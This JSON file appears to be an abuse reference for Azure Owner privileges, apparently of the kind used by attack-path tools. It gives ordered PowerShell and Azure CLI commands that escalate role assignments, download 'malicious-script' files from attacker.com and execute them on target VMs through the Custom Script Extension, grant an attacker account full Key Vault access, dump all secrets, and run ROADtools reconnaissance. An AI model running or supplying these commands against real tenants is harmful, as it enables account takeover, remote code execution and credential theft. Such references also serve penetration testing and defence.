{
    "AZOwner": {
        "meaning": "The principal is granted the Owner role on the resource. Everything a Contributor can do, with the addition of assigning rights to resources. Object ownership means almost all abuses are possible against the target object.",
        "common": "",
        "windows": {
            "PowerShell_RoleAssignment": [
                {
                    "order": 1,
                    "command": "Connect-AzAccount",
                    "description": "Connect to Azure account"
                },
                {
                    "order": 2,
                    "command": "New-AzRoleAssignment -SignInName 'user@domain.com' -RoleDefinitionName 'Contributor' -Scope '/subscriptions/subscription-id'",
                    "description": "Assign Contributor role to other users"
                },
                {
                    "order": 3,
                    "command": "New-AzRoleAssignment -SignInName 'user@domain.com' -RoleDefinitionName 'Owner' -Scope '/subscriptions/subscription-id/resourceGroups/rg-name'",
                    "description": "Assign Owner role to specific resource groups"
                }
            ],
            "VM_CustomScript": [
                {
                    "order": 1,
                    "command": "Connect-AzAccount",
                    "description": "Connect to Azure account"
                },
                {
                    "order": 2,
                    "command": "$settings = @{\"fileUris\" = @('https://attacker.com/malicious-script.ps1'); \"commandToExecute\" = 'powershell -ExecutionPolicy Unrestricted -File malicious-script.ps1'}",
                    "description": "Configure custom script extension settings"
                },
                {
                    "order": 3,
                    "command": "Set-AzVMCustomScriptExtension -ResourceGroupName 'RG' -VMName 'TargetVM' -Name 'CustomScript' -TypeHandlerVersion '1.10' -Settings $settings",
                    "description": "Execute custom script on target VM using Owner privileges"
                }
            ],
            "KeyVault_Management": [
                {
                    "order": 1,
                    "command": "Connect-AzAccount",
                    "description": "Connect to Azure account"
                },
                {
                    "order": 2,
                    "command": "Set-AzKeyVaultAccessPolicy -VaultName 'KeyVaultName' -UserPrincipalName 'attacker@domain.com' -PermissionsToSecrets get,list,set,delete -PermissionsToKeys get,list,create,delete",
                    "description": "Grant full access to Key Vault secrets and keys"
                },
                {
                    "order": 3,
                    "command": "Get-AzKeyVaultSecret -VaultName 'KeyVaultName' | ForEach-Object { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_.SecretValue)) }",
                    "description": "Extract all secrets from Key Vault"
                }
            ]
        },
        "linux": {
            "AzureCLI_RoleAssignment": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Login to Azure account"
                },
                {
                    "order": 2,
                    "command": "az role assignment create --assignee 'user@domain.com' --role 'Contributor' --scope '/subscriptions/subscription-id'",
                    "description": "Assign Contributor role to other users"
                },
                {
                    "order": 3,
                    "command": "az role assignment create --assignee 'user@domain.com' --role 'Owner' --scope '/subscriptions/subscription-id/resourceGroups/rg-name'",
                    "description": "Assign Owner role to specific resources"
                }
            ],
            "VM_CustomScript": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Login to Azure account"
                },
                {
                    "order": 2,
                    "command": "az vm extension set --resource-group 'RG' --vm-name 'TargetVM' --name customScript --publisher Microsoft.Azure.Extensions --settings '{\"fileUris\":[\"https://attacker.com/malicious-script.sh\"],\"commandToExecute\":\"./malicious-script.sh\"}'",
                    "description": "Execute custom script on target VM"
                }
            ],
            "KeyVault_Management": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Login to Azure account"
                },
                {
                    "order": 2,
                    "command": "az keyvault set-policy --name 'KeyVaultName' --upn 'attacker@domain.com' --secret-permissions get list set delete --key-permissions get list create delete",
                    "description": "Grant full access to Key Vault"
                },
                {
                    "order": 3,
                    "command": "az keyvault secret list --vault-name 'KeyVaultName' --query '[].name' -o tsv | xargs -I {} az keyvault secret show --vault-name 'KeyVaultName' --name {} --query 'value' -o tsv",
                    "description": "Extract all secrets from Key Vault"
                }
            ],
            "ROADtools": [
                {
                    "order": 1,
                    "command": "roadrecon auth -u user@domain.com -p password",
                    "description": "Authenticate with ROADtools"
                },
                {
                    "order": 2,
                    "command": "roadrecon gather --mfa",
                    "description": "Gather Azure information including Owner privileges"
                }
            ]
        }
    }
}
